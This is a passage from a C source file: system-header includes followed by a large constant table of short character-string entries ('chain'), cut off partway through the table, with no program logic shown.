#define _GNU_SOURCE
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>

const char* chain[80][44] = {{"+,-./0", "+,-./0", "+|,-./", "f+,-./", "+lp|,-", "+|,-./", "+|,-./", "f+,-./", "-+,./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+|,-./", "+f|,-.", "+|-,./", "f+,-./", "+,-./0", "+|,-./", "+|f,-.", "+|f,-.", "+|f,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "tilmpu", "cltsdm", "cnsfud", "scwrtd", "cdsrpt", "wcplst", "lecsdt", "mecptd", "lctsdi", "mcsptg", "msagtc", "stcdgx", "gscadl", "c1ds3a", "gcr23a", "gcsdla", "gaclor", "gcds1a", "g2b3ds", "vabcnr", "ds1abc", "abd123", "3b1acd", "3ae+,-", "+,-./0", "+,-./0", "i+,-./", "+,-./0", "i+,-./", "+,-./0", "+,-./0", "+,-./0", "x+,-./", "+,-./0", "+,-./0", "+,-./0", "s+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "bgls+,", "3dg+,-", "efmbcl", "sf19cp", "1flp23", "1s7lp+", "s1p09f", "01s+,-", "102fpj", "02cps+", "0psabc", "p05ds+", "014bps", "5blst+", "0bg+,-", "06p+,-", "s2+,-.", "bs+,-.", "0s26b+", "0b+,-.", "0+,-./", "2Fs+,-", "02+,-.", "02+,-.", "02+,-.", "0+,-./", "1+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "2+,-./", "|+,-./", "0|-+,.", "1x|+,-", "|03b+,", "1|x+,-", "-.|+,/", ".|-0+,", "|-0+,.", "|-+,./", "-.|+,/", "-|+,./", "-x|+,.", "|+,-./", "|-1+,.", "+,-./0", "1+,-./", "|+,-./", "|-+,./", "-|+,./", "+,-./0", "|+,-./", "|+,-./", "|+,-./", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "17rdlt", "t01p-2", "256CDP", "-2a|+,", "0|1DE+", "|6_-01", "0-1|2k", "1|.023", ".0|-+,", "|.126+", ".612|+", ".+,-/0", ".|+,-/", ".k+,-/", ".035+,", "02+,-.", "|+,-./", "036+,-", ".+,-/0", "0+,-./", "29|+,-", "2+,-./", "2+,-./", "3+,-./", "+,-./0", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "t|+,-.", "fp6sai", "-p|gtb", "rtx|gh", "|dop3t", "s|w_pr", "|f-.05", "|5f-.c", "|f3chl", "|-.dkl", "|b+,-.", "|.8dep", "|.i+,-", "|-.+,/", "|+,-./", "-|1np+", "|.l+,-", "-|.5+,", "5l+,-.", ".|+,-/", ".|+,-/", ".l|+,-", ".l+,-/", ".l|+,-", ".|+,-/", ".|+,-/", ".+,-/0", ".+,-/0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "B|+,-.", "-b8t+,", "_|rt+,", "-|d.28", "|.2dh+", ".|-2d+", ".2|-18", "|2.4+,", "|2d+,-", "|.2d-x", "2+,-./", "2|+,-.", "2+,-./", "289|+,", "2-+,./", "29+,-.", "20+,-.", "2-+,./", "+,-./0", ".23|+,", ".+,-/0", "-+,./0", "-+,./0", "2+,-./", "2+,-./", ".2+,-/", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "1c|+,-", "m2l|4c", "chlpt|", "-e.hlm", "|hs+,-", "-hs|4_", "-|m2+,", "-|.em+", "mpv|+,", "-|2l+,", "|e+,-.", "_-+,./", "+,-./0", "|+,-./", "|e+,-.", "|+,-./", "|+,-./", "|e+,-.", "-_+,./", "-_+,./", "-+,./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "cdfrst", "+|.clp", ".-_|1c", "-.|06+", "|.16r+", "6|+,-.", "|16+,-", "|.6+,-", "|2+,-.", "|+,-./", "|+,-./", "|+,-./", "|+,-./", "|6+,-.", "|+,-./", ".0|+,-", "+,-./0", "|3+,-.", "5+,-./", "1+,-./", "+,-./0", "|+,-./", "|+,-./", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "8+,-./", "_t4|5+", "-4+,./", "4|05+,", "4|rs+,", "4|8+,-", "-4|_+,", "4|_-s+", "4-05|+", "4|+,-.", "|+,-./", "79+,-.", "8+,-./", "|4_+,-", "_4+,-.", "_4+,-.", "4|_+,-", "4|+,-.", "4+,-./", "|+,-./", "4+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "|+,-./", "+,-./0", "n|+,-.", "+,-./0", "|7+,-.", "+,-./0", "3|+,-.", "|+,-./", "-+,./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "69+,-.", "6e+,-.", "-m+,./", ".4|+,-", "|.s+,-", "-6+,./", "6k+,-.", "5+,-./", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "6|+,-.", "6k+,-.", "6x+,-.", "6|+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "|9+,-.", "e+,-./", "+,-./0", "04+,-.", "|+,-./", "1+,-./", ".0+,-/", ".+,-/0", ".+,-/0", "+,-./0", "+,-./0", "+,-./0", "9+,-./", "03+,-.", "+,-./0", "2+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "Dm+,-.", "+,-./0", "+,-./0", "vu+,-.", "+,-./0", "+,-./0", "p+,-./", "+,-./0", "+,-./0", "p+,-./", "p+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "a+,-./", "ai+,-.", "f+,-./", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "y+,-./", "+,-./0", "+,-./0", "oC|+,-", "ho+,-.", "+,-./0", "o+,-./", "o+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "r+,-./", "L+,-./", "+,-./0", "ey+,-.", "e+,-./", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "Qn+,-.", "Q+,-./", "Q+,-./", "n+,-./", "n+,-./", "+,-./0", "a+,-./", "Q+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "i+,-./", "+,-./0", "r+,-./", "+,-./0", "io+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "o+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "r+,-./", "+,-./0", "i+,-./", "aEr+,-", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", "m+,-./", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "x+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "s+,-./", "p+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "i+,-./", "+,-./0", "+,-./0", "i+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "aV+,-.", "+,-./0", "ua+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "e+,-./", "+,-./0", "p+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "P+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "i+,-./", "N+,-./", "i+,-./", "h+,-./", "ao+,-.", "e+,-./", "+,-./0", "+,-./0", "a+,-./", "l+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "2+,-./", "3|+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "|+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "o+,-./", "+,-./0", "+,-./0", "+,-./0", "e+,-./", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "vo+,-.", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "hp+,-.", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "h+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "u+,-./", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "n+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "I+,-./", "+,-./0", "+,-./0", "I+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "e+,-./", "+,-./0", "e+,-./", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"|+,-./", "enovw+", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "2+,-./", "+,-./0", "+,-./0", "+,-./0", "2+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", }, {"+,-./0", "a+,-./", "+,-./0", "+,-./0", "+,-./0", "i+,-./", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", "+,-./0", 